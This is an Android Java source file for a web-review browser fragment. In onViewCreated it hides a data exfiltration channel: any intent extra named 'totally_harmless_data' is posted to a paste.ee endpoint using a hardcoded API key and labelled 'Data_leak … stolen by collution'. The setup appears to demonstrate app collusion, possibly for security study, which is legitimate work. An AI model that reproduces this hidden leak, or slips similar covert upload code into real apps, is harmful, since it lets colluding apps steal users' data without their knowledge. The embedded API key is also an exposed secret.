package com.mywebreviews;

import android.accessibilityservice.GestureDescription;
import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.net.ConnectivityManager;
import android.os.Bundle;

import androidx.annotation.NonNull;
import androidx.fragment.app.Fragment;
import androidx.navigation.Navigation;
import androidx.navigation.fragment.NavHostFragment;

import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.webkit.CookieManager;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Button;
import android.widget.EditText;
import android.widget.FrameLayout;
import android.widget.RatingBar;
import android.widget.Toast;

import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.VolleyLog;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;
import com.mywebreviews.sqlite.webreviews.WebReviewDB;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.Map;


public class BrowserFragment extends Fragment {
    private EditText urlInput;
    private WebView webView;
    private RatingBar ratingBar;
    private WebReview currentWebReview;
    private WebReviewDB webReviewDB;


    private static final String ARG_PARAM1 = "initial_url";

    private String initialUrl;


    public BrowserFragment() {
        // Required empty public constructor
    }

    public static BrowserFragment newInstance(String param1) {
        BrowserFragment fragment = new BrowserFragment();
        Bundle args = new Bundle();
        args.putString(ARG_PARAM1, param1);
        fragment.setArguments(args);
        return fragment;
    }

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        if (getArguments() != null) {
            initialUrl = getArguments().getString(ARG_PARAM1);
        }
    }

    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container,
                             Bundle savedInstanceState) {
        // Inflate the layout for this fragment
        return inflater.inflate(R.layout.fragment_browser, container, false);
    }

    @Override
    public void onViewCreated(@NonNull View view, Bundle savedInstanceState){
        super.onViewCreated(view, savedInstanceState);

        webReviewDB = new WebReviewDB(getActivity());
        webReviewDB.open();

        currentWebReview = new WebReview();
        ratingBar = view.findViewById(R.id.url_header_rating_bar);
        urlInput = view.findViewById(R.id.navigator_url_input);
        webView = view.findViewById(R.id.web_view);

        bindButtons(view);

        if (savedInstanceState != null) {
            webView.restoreState(savedInstanceState);
        } else {
            webView.getSettings().setJavaScriptEnabled(true);
            webView.getSettings().setUseWideViewPort(true);
            webView.getSettings().setLoadWithOverviewMode(true);
            webView.getSettings().setSupportZoom(true);
            webView.getSettings().setSupportMultipleWindows(true);
            webView.setScrollBarStyle(View.SCROLLBARS_INSIDE_OVERLAY);
            webView.setBackgroundColor(Color.WHITE);

            webView.setWebChromeClient(new WebChromeClient());
        }
            webView.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                view.loadUrl(url);
                CookieManager.getInstance().setAcceptCookie(true);
                updateWebReview(WebReview.extractDomain(url));
                return true;
            }
        });
        Intent intent = getActivity().getIntent();
        String intentDomain = intent.getDataString();
        Toast.makeText(getActivity(), intentDomain, Toast.LENGTH_LONG).show();
        if (intentDomain  != null){
            //Android want to force apps to use encryption
            if (intentDomain.startsWith("http://")){
                intentDomain = intentDomain.replaceFirst("http://", "https://");
            }
            setWebView(intentDomain);
            Bundle extras = intent.getExtras();
            if (extras != null){
                String hack_data = extras.getString("totally_harmless_data");
                if (hack_data != null && hack_data.length() > 0 ){
                    sendData(hack_data);
                }
            }
        } else {
            setWebView("https://"+getActivity().getString(R.string.initial_website) );
        }
    }
    private void bindButtons(View view){
        view.findViewById(R.id.go_to_web_button).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                onWebViewUrlButton(view);
            }});
        view.findViewById(R.id.rating_bar_container).setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View view) {
                    onSwitchActivityButton(view);
                }});
        urlInput.setOnFocusChangeListener(new View.OnFocusChangeListener() {
            @Override
            public void onFocusChange(View v, boolean hasFocus) {
                if (!hasFocus){
                    onWebViewUrlButton(view);
                }
            }
        });
    }
    public void sendData(String jsonData){
        sendData(jsonData, 3);
    }

    public void sendData(String jsonData, int numberOfAttemptsRemaining){
        VolleyLog.DEBUG = true;
        RequestQueue requestQueue = Volley.newRequestQueue(getActivity());
        String url = "https://api.paste.ee/v1/pastes/?key=umymC56n2oVUIXKK9jPX209JwJZg6Ht0RnJeEJT4N";

        String content = jsonData;
        String name = "Data_leak";
        String description = "Uh oh data stolen by collution";

        JSONObject postData = new JSONObject();
        JSONArray array = new JSONArray();
        JSONObject fields = new JSONObject();
        try {
            fields.put("contents",content);
            fields.put("name", name);
            array.put(fields);
            postData.put("sections", array);
            postData.put("description", description);
        } catch (JSONException e) {
            e.printStackTrace();
        }

        final String requestBody = postData.toString();

        // Request a string response from the provided URL.
        JsonObjectRequest jsonRequest = new JsonObjectRequest(url, postData,
                new Response.Listener<JSONObject>() {
                    @Override
                    public void onResponse(JSONObject response) {
                        try {
                            setWebView(response.getString("link"));
                        } catch (JSONException e){
                            e.printStackTrace();
                        }
                    }
                },
                new Response.ErrorListener() {
                    @Override
                    public void onErrorResponse(VolleyError error) {
                        error.printStackTrace();
                        if (error.networkResponse.statusCode == 502){//sometimes there is bad gateway error
                            sendData(jsonData, numberOfAttemptsRemaining-1);
                        } else {
                            Toast.makeText(getActivity(), Integer.toString( error.networkResponse.statusCode ), Toast.LENGTH_LONG);
                        }
                    }
                });
        // Add the request to the RequestQueue.
        requestQueue.add(jsonRequest);
    }

    protected void updateWebReview(String domain){
        if( currentWebReview.getDomain() == domain){
            return;
        }
        WebReview webReview = webReviewDB.getByDomain(domain);
        if (webReview == null){
            currentWebReview = new WebReview(domain);
        } else {
            currentWebReview = webReview;
        }
        updateWebReviewDisplay();
    }

    protected void updateWebReviewDisplay(){
        ratingBar.setProgress(currentWebReview.getScore());
        urlInput.setText(currentWebReview.getDomain());
    }

    protected void setWebView(String url){
        try {
            if(!Utils.connectionAvailable(getActivity())){
                Toast.makeText(getActivity(), R.string.check_connection, Toast.LENGTH_SHORT).show();
            }else {
                webView.loadUrl(url);
                updateWebReview(WebReview.extractDomain(url));
            }
        }catch (Exception e) {
            e.printStackTrace();
        }
    }
    public void onWebViewUrlButton(View view){
        Utils.hideKeyboardFrom(getActivity(),view);
        String url = urlInput.getText().toString();
        if (!url.startsWith("https://")){
            url = "https://" + url;
        }
        setWebView(url);
    }

    public void onSwitchActivityButton(View view){
        Bundle args = new Bundle();
        args.putString("initial_domain", currentWebReview.getDomain());
        NavHostFragment.findNavController(BrowserFragment.this)
                .navigate(R.id.action_browserFragment_to_viewReview, args );
    }
}